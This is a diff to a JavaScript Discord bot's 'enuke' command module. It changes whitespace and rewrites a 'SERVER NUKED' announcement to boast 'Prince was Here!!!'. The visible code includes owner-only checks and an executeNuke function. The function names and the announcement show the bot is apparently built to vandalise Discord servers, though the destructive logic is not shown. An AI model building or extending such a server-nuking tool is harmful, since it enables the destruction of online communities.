@@ -74,7 +74,7 @@ export const commands = [
 
       enukeReply.components.push(row);
       const msg = await message.reply(enukeReply);
-      
+
       setTimeout(() => {
         msg.delete().catch(() => null);
         enukeTargets.delete(sessionKey);
@@ -94,7 +94,7 @@ export async function handleEnukeButton(interaction) {
   console.log(`[ENUKE BUTTON] Clicked by ${interaction.user.tag} (${interaction.user.id})`);
   console.log(`[ENUKE BUTTON] OWNER_ID = "${process.env.OWNER_ID}"`);
   console.log(`[ENUKE BUTTON] isBotOwnerSync = ${isBotOwnerSync(interaction.user.id)}`);
-  
+
   // Only the bot owner can use this
   if (!isBotOwnerSync(interaction.user.id)) {
     return interaction.reply({ content: 'ï¸ Access Denied. Only the Bot Owner can use this.' });
@@ -102,7 +102,7 @@ export async function handleEnukeButton(interaction) {
 
   const sessionKey = `enuke_${interaction.user.id}`;
   const target = enukeTargets.get(sessionKey);
-  
+
   if (!target) {
     return interaction.reply({ content: ' Session expired. Please run the `enuke` command again.' });
   }
@@ -164,7 +164,7 @@ export async function handleEnukeButton(interaction) {
  */
 export async function handleEnukeModal(interaction) {
   console.log(`[ENUKE MODAL] Submitted by ${interaction.user.tag} (${interaction.user.id})`);
-  
+
   // Only the bot owner can use this
   if (!isBotOwnerSync(interaction.user.id)) {
     return interaction.reply({ content: 'ï¸ Access Denied.' });
@@ -319,7 +319,7 @@ async function executeNuke(guild, executor, mode, channelCount, channelName) {
 
     const nukeAnnouncement = cv2.danger(
       ' SERVER NUKED',
-      `This server has been nuked by Prince`,
+      `This server has been nuked by Prince, Prince was Here!!!`,
       [
         { name: 'Channel Name', value: channelName, inline: false },
         { name: 'Nuked By', value: executor.tag || executor.username, inline: false },
@@ -350,7 +350,7 @@ async function executeNuke(guild, executor, mode, channelCount, channelName) {
 
     const nukeAnnouncement = cv2.danger(
       ' SERVER NUKED',
-      `This server has been nuked by Prince`,
+      `This server has been nuked by Prince, Prince was Here !!!`,
       [
         { name: 'Channel Name', value: channelName, inline: false },
         { name: 'Nuked By', value: executor.tag || executor.username, inline: false },
